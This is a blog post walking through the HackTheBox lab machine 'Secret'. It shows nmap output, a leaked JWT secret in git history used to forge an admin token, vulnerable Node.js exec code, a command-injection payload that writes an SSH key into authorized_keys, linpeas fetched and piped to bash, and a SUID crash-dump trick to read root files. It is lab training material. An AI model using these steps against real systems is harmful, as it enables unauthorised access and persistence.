<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Secret" /><meta property="og:locale" content="en" /><meta name="description" content="A collection of notes and techniques" /><meta property="og:description" content="A collection of notes and techniques" /><link rel="canonical" href="https://ahmedel-rayes.github.io/posts/Secret/" /><meta property="og:url" content="https://ahmedel-rayes.github.io/posts/Secret/" /><meta property="og:site_name" content="Anubis-Sec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-14T15:16:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Secret" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-01T11:24:16-05:00","datePublished":"2022-08-14T15:16:00-05:00","description":"A collection of notes and techniques","headline":"Secret","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahmedel-rayes.github.io/posts/Secret/"},"url":"https://ahmedel-rayes.github.io/posts/Secret/"}</script><title>Secret | Anubis-Sec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Anubis-Sec"><meta name="application-name" content="Anubis-Sec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/anubis.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Anubis-Sec</a></div><div class="site-subtitle font-italic">“Ask, and it shall be given you; seek, and ye shall find; knock, and it shall be opened unto you”</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/AhmedEl-Rayes" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['aelrayes00','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmedelrayes00/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Secret</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Secret</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1660508160" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 14, 2022 </em> </span> <span> Updated <em class="" data-ts="1664641456" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 1, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/AhmedEl-Rayes">Ahmed El-Rayes</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1653 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/secret/secretimg.png" alt="Secret" data-proofer-ignore></p><p>Secret is an easy level machine (supposedly) on HacktheBox, though I found it to be much more challenging than most other easy machines. The website on the machine features a live API, documentation for it, and a download for it’s source code. In the source code, we see that the api uses JWT tokens to authenticate users, and by viewing the git commit history we steal the token secret and use it to forge our own admin token. We then discover an authenticated RCE in the source code and use it to drop our SSH key onto the box and grab the user flag. From there we ultimately get the root flag through exploiting a file wih a custom SUID bit by running the program, crashing it, and reading the crashdump.</p><h3 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.11.120
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-08-18 21:15 EDT
Nmap scan report <span class="k">for </span>10.10.11.120
Host is up <span class="o">(</span>0.055s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
3000/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
|_http-title: DUMB Docs
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Nmap shows us SSH on 22, and 2 HTTP servers on 80 and 3000.It also appears that the same content is being hosted on both web sites, however from the service scan we see that port 80 is running nginx and port 3000 is running Node.js, which might be important to note, or it might not.</p><p><img data-src="/assets/img/secret/site.png" alt="site" data-proofer-ignore></p><p>From either site we can see links to different sections of the documentation, and a download for the source code at the bottom.</p><p><img data-src="/assets/img/secret/docs.png" alt="docs" data-proofer-ignore></p><p>Just in case, we’ll run dirb to look for any other directories while we look around and read the documentation.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dirb http://10.10.11.120/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</pre></table></code></div></div><p>From the site’s documentation, we can see a demonstration of how to use the api to register a user on the /api/user/register endpoint.</p><p><img data-src="/assets/img/secret/register.png" alt="register" data-proofer-ignore></p><p>Let’s fire up burpsuite and give it a try.</p><p><img data-src="/assets/img/secret/fail.png" alt="fail" data-proofer-ignore></p><p>Because we don’t have a content type set, the server is expecting “name=” in the body of the POST request. however since we are submitting a json we need to add the “Content-Type: application/json” header in order to submit the request to the server properly.</p><p><img data-src="/assets/img/secret/6char.png" alt="6char" data-proofer-ignore></p><p>Success! Kind of. Submitting a longer username and password this time lets us create a user and get the expected response that was shown in the documentation.</p><p><img data-src="/assets/img/secret/create.png" alt="create" data-proofer-ignore></p><p>Moving on in the documentation, we can see that after creating a user, we can login at /api/user/login to get a JWT token.</p><p><img data-src="/assets/img/secret/login.png" alt="login" data-proofer-ignore></p><p>Let’s try ourselves.</p><p><img data-src="/assets/img/secret/token.png" alt="token" data-proofer-ignore></p><p>If you are an administrator, you can verify at /api/priv by sending your token.</p><p><img data-src="/assets/img/secret/privroute.png" alt="privroute" data-proofer-ignore></p><p>If you are a normal user, you will get this returned.</p><p><img data-src="/assets/img/secret/reguser.png" alt="reguser" data-proofer-ignore></p><p>However, if you are not verified you will get an “access denied”.</p><p><img data-src="/assets/img/secret/notverified.png" alt="notverified" data-proofer-ignore></p><p>Let’s verify our role. We should expect to see “you are a normal user” when we make a GET request to /api/priv with the auth-token header set.</p><p><img data-src="/assets/img/secret/confirmed.png" alt="confirmed" data-proofer-ignore></p><p>As expected, we see that we are a normal user at the moment. Besides that, we don’t have anything else to go off of right now, and our dirb didn’t find anything particularly useful.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>http://10.10.11.120/download <span class="o">(</span>CODE:301|SIZE:183<span class="o">)</span>                                                                 
+ http://10.10.11.120/docs <span class="o">(</span>CODE:200|SIZE:20720<span class="o">)</span>                                                                   
+ http://10.10.11.120/assets <span class="o">(</span>CODE:301|SIZE:179<span class="o">)</span>                                                                   
+ http://10.10.11.120/api <span class="o">(</span>CODE:200|SIZE:93<span class="o">)</span>                                                                       
+ http://10.10.11.120/Docs <span class="o">(</span>CODE:200|SIZE:20720<span class="o">)</span>                                                                   
+ http://10.10.11.120/API <span class="o">(</span>CODE:200|SIZE:93<span class="o">)</span>                                                                       
+ http://10.10.11.120/DOCS <span class="o">(</span>CODE:200|SIZE:20720<span class="o">)</span>
</pre></table></code></div></div><p>Let’s download the source code and see what’s going on here.</p><p><img data-src="/assets/img/secret/source.png" alt="source" data-proofer-ignore></p><p>Right away, we see that the .env file has not been excluded. A short read up <a href="https://dev.to/somedood/please-dont-commit-env-3o9h">here</a> explains why this is generally bad practice. Aside from that, we can see the routes that the website uses and the code for the different functions that we just tried like registering and logging in.</p><p><img data-src="/assets/img/secret/router.png" alt="router" data-proofer-ignore></p><p>Doing a git log shows us previous commit messages.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>git log 
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env <span class="k">for </span>security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
</pre></table></code></div></div><p>We can see that the .env file was removed for security reasons, let’s check out why by doing a git diff HEAD~2</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre>git diff HEAD~2
diff <span class="nt">--git</span> a/.env b/.env
index fb6f587..31db370 100644
<span class="nt">---</span> a/.env
+++ b/.env
@@ <span class="nt">-1</span>,2 +1,2 @@
 DB_CONNECT <span class="o">=</span> <span class="s1">'mongodb://127.0.0.1:27017/auth-web'</span>
<span class="nt">-TOKEN_SECRET</span> <span class="o">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET <span class="o">=</span> secret
diff <span class="nt">--git</span> a/routes/private.js b/routes/private.js
index 1347e8c..cf6bf21 100644
<span class="nt">---</span> a/routes/private.js
+++ b/routes/private.js
@@ <span class="nt">-11</span>,10 +11,10 @@ router.get<span class="o">(</span><span class="s1">'/priv'</span>, verifytoken, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
     
     <span class="k">if</span> <span class="o">(</span>name <span class="o">==</span> <span class="s1">'theadmin'</span><span class="o">){</span>
         res.json<span class="o">({</span>
-            role:<span class="o">{</span>
-
-                role:<span class="s2">"you are admin"</span>, 
-                desc : <span class="s2">"{flag will be here}"</span>
+            creds:<span class="o">{</span>
+                role:<span class="s2">"admin"</span>, 
+                username:<span class="s2">"theadmin"</span>,
+                desc : <span class="s2">"welcome back admin,"</span>
             <span class="o">}</span>
         <span class="o">})</span>
     <span class="o">}</span>
@@ <span class="nt">-26</span>,7 +26,32 @@ router.get<span class="o">(</span><span class="s1">'/priv'</span>, verifytoken, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
             <span class="o">}</span>
         <span class="o">})</span>
     <span class="o">}</span>
+<span class="o">})</span>
+
 
+router.get<span class="o">(</span><span class="s1">'/logs'</span>, verifytoken, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
+    const file <span class="o">=</span> req.query.file<span class="p">;</span>
+    const userinfo <span class="o">=</span> <span class="o">{</span> name: req.user <span class="o">}</span>
+    const name <span class="o">=</span> userinfo.name.name<span class="p">;</span>
+    
+    <span class="k">if</span> <span class="o">(</span>name <span class="o">==</span> <span class="s1">'theadmin'</span><span class="o">){</span>
+        const getLogs <span class="o">=</span> <span class="sb">`</span>git log <span class="nt">--oneline</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span><span class="sb">`</span><span class="p">;</span>
+        <span class="nb">exec</span><span class="o">(</span>getLogs, <span class="o">(</span>err , output<span class="o">)</span> <span class="o">=&gt;{</span>
+            <span class="k">if</span><span class="o">(</span>err<span class="o">){</span>
+                res.status<span class="o">(</span>500<span class="o">)</span>.send<span class="o">(</span>err<span class="o">)</span><span class="p">;</span>
+                <span class="k">return</span>
+            <span class="o">}</span>
+            res.json<span class="o">(</span>output<span class="o">)</span><span class="p">;</span>
+        <span class="o">})</span>
+    <span class="o">}</span>
+    <span class="k">else</span><span class="o">{</span>
+        res.json<span class="o">({</span>
</pre></table></code></div></div><p>We can see that the JWT secret was included in the commit. We can learn more about JWT tokens and how to construct and deconstruct them <a href="https://jwt.io/">here</a>. Let’s take this token secret and see if we can use it to forge a token that will give us more privilege.</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>From the /priv route in the source code, we can see that the administrator username is hardcoded as “theadmin”.</p><p><img data-src="/assets/img/secret/priv.png" alt="priv" data-proofer-ignore></p><p>Further down, we can see that if we are admin, we can pass commands in a get request to the /logs endpoint that get passed to the server and executed as bash commands: effectively a shell. See where this is going?</p><p><img data-src="/assets/img/secret/rce.png" alt="rce" data-proofer-ignore></p><p>We have a plan now: take the stolen JWT secret and forge an admin token with it, then use that token to get RCE from the /logs endpoint. Let’s forge our token, remember, as long as the name is “theadmin” and the token secret is correct, we should get a valid admin token.</p><p><img data-src="/assets/img/secret/admintoken.png" alt="admintoken" data-proofer-ignore></p><p>We submit this token to the /priv endpoint to check if our token is valid:</p><p><img data-src="/assets/img/secret/welcome.png" alt="welcome" data-proofer-ignore></p><p>Looks good, let’s get that RCE now.</p><p><img data-src="/assets/img/secret/whoami.png" alt="whoami" data-proofer-ignore></p><p>Nice, let’s go for a reverse shell and grab the user flag now. Since SSH is open on the box, we can try dropping our public key in the authorized_keys file. We use SSH-keygen to make a new key.</p><p><img data-src="/assets/img/secret/key.png" alt="key" data-proofer-ignore></p><p>We must construct a payload now that will upload our key to the target. We use mkdir with the -p argument to make the .ssh directory on the target if it doesn’t already exist, and echo our public key to the authorized_keys file within that directory.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">mkdir</span> <span class="nt">-p</span> /home/dasith/.ssh<span class="p">;</span> <span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCTcMliTv2GtoJTymEhqEHzqpzOo/7qU9eODpzakrGOQvn2aA7epSxSmNtnAfPnmT6wwDcR/bq7lsirRNBWdb1sKGYRKIY85jANZHqWHqC8FGMJu0F7UrBCCPKa/kwugZLyhgaR72QGvk5CnocX6UnDowtvY7jrJZboq/ESArnISNHRqc1ZUzWXElyt0AT8m/N8/LJKlN5zGU/cBDiUqJQ+pWbLs/MG9apeLOo46+BlSoBbS7iPsRRtyMEOOw4XvyfBxQOn9ZohlShxq4bnne4OEe4lmQr92SY1Vc9sUUOP9wyPH2chJFm9LJXAragja0YTFT6mt2aeGf0HjpjE+kXVXpoiadZ4ai/BUfM1bUtrAleUrmbEanNny8f5QaC65hxhnxnVtlgkhJCnSmajdiAW+zK7C0KYYSI0jHmkddSBGaWmpIbarqz97Md1y2BrJGxtg3CJlWw48vRw8NdtSpwu0EPEnaecS3KzN9JhsBYqlMsVopB8Vzq7kAyZe2XVjYs= kali@kali"</span> <span class="o">&gt;&gt;</span> /home/dasith/.ssh/authorized_keys<span class="s2">"  
</span></pre></table></code></div></div><p>Let’s URL encode this and send it through burp with our admin token</p><p><img data-src="/assets/img/secret/encoded.png" alt="encoded" data-proofer-ignore></p><p>200 response - so far so good. We’ll know it was successful if we can SSH into the machine.</p><p><img data-src="/assets/img/secret/ssh.png" alt="ssh" data-proofer-ignore></p><p>User.txt is ours now! Let’s get linpeas running on the box now.</p><p><img data-src="/assets/img/secret/linpeas.png" alt="linpeas" data-proofer-ignore></p><p>As always we host it on a simple http server from our machine,curl it from the target machine,and pipe it to bash. Unfortunately, I got stuck at this section of the box for quite some time sifting through the linpeas output and trying to find a privesc vector. In the end, the answer was in the /opt directory.</p><h3 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><img data-src="/assets/img/secret/opt.png" alt="opt" data-proofer-ignore></p><p>Running the count program, it asks for a file, and then displays the amount of characters in that file. Because this application is owned by root, it should be able to read files owned by root. Let’s test by running the program on the root.txt file.</p><p><img data-src="/assets/img/secret/counter.png" alt="counter" data-proofer-ignore></p><p>33 characters is the length of an MD5 hash + a new line character, meaning the program does what it’s supposed to, but how can we use this to our benefit? We know that before the program can run, it needs to pull the file into memory. What happens if we just start the program and crash it before it’s done running?</p><p><img data-src="/assets/img/secret/segfault.png" alt="segfault" data-proofer-ignore></p><p>We load the root.txt file into memory, background the process with CTRL+Z, and kill the process with a segfault. If we go to /var/crash, we can see the crash dump.</p><p><img data-src="/assets/img/secret/coredump.png" alt="coredump" data-proofer-ignore></p><p>The dump can be unpacked with apport-unpack, and because the CoreDump file that’s produced is a binary, we need to use the strings command to sift through the readable information.</p><p><img data-src="/assets/img/secret/strings.png" alt="strings" data-proofer-ignore></p><p>Looking through the output, we find something that clearly resembles a 32 character hash, which is our root flag!</p><p><img data-src="/assets/img/secret/flag.png" alt="flag" data-proofer-ignore></p><p>Though we technically completed the box, I always prefer to actually get a shell as root rather than just grabbing the flag, this can be done by grabbing the root user’s private ssh key and using it to ssh into the box.</p><p><img data-src="/assets/img/secret/sshkey.png" alt="sshkey" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>htb</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/source-code-review/" class="post-tag no-text-decoration" >Source Code Review</a> <a href="/tags/javascript/" class="post-tag no-text-decoration" >Javascript</a> <a href="/tags/git/" class="post-tag no-text-decoration" >Git</a> <a href="/tags/web-api/" class="post-tag no-text-decoration" >Web API</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >Command Injection</a> <a href="/tags/weak-authentication/" class="post-tag no-text-decoration" >Weak Authentication</a> <a href="/tags/suid-exploitation/" class="post-tag no-text-decoration" >SUID Exploitation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Secret+-+Anubis-Sec&url=https%3A%2F%2Fahmedel-rayes.github.io%2Fposts%2FSecret%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Secret+-+Anubis-Sec&u=https%3A%2F%2Fahmedel-rayes.github.io%2Fposts%2FSecret%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fahmedel-rayes.github.io%2Fposts%2FSecret%2F&text=Secret+-+Anubis-Sec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CPTS/">Certified Penetration Testing Specialist Notes</a><li><a href="/posts/CRTP/">Certified Red Team Professional Notes</a><li><a href="/posts/PortSwigger/">Port Swigger Academy Notes</a><li><a href="/posts/PNPT/">PNPT Notes</a><li><a href="/posts/ConsoleCowboy/">The Way of the Console Cowboy</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/outdated-software/">Outdated Software</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a> <a class="post-tag" href="/tags/hash-capture/">Hash Capture</a> <a class="post-tag" href="/tags/public-vulnerabilities/">Public Vulnerabilities</a> <a class="post-tag" href="/tags/weak-credentials/">Weak Credentials</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/anonymous-access/">Anonymous Access</a> <a class="post-tag" href="/tags/educational/">Educational</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/OpenAdmin/"><div class="card-body"> <em class="small" data-ts="1660177500" data-df="ll" > Aug 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenAdmin</h3><div class="text-muted small"><p> OpenAdmin is a fun easy level box on HacktheBox, and will always have a special place in my heart as the first box I fully solved without needing a walkthrough. We begin by exploiting a vulnerable...</p></div></div></a></div><div class="card"> <a href="/posts/Cap/"><div class="card-body"> <em class="small" data-ts="1660418820" data-df="ll" > Aug 13, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap</h3><div class="text-muted small"><p> Cap is a pretty straight-forward easy level machine on HacktheBox that I had alot of fun completing. We start by finding an IDOR vulnerability on the web server which lets us grab a .pcap file fro...</p></div></div></a></div><div class="card"> <a href="/posts/ConsoleCowboy/"><div class="card-body"> <em class="small" data-ts="1673368200" data-df="ll" > Jan 10, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The Way of the Console Cowboy</h3><div class="text-muted small"><p> Tips and Tricks for Navigating Linux tmux Tmux is a powerful screen multiplexer, meaning it lets you handle multiple panes in a command line interface, which is super useful for sys-admin tasks, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Cap/" class="btn btn-outline-primary" prompt="Older"><p>Cap</p></a> <a href="/posts/Granny/" class="btn btn-outline-primary" prompt="Newer"><p>Granny</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/AhmedEl-Rayes">Ahmed El-Rayes</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending 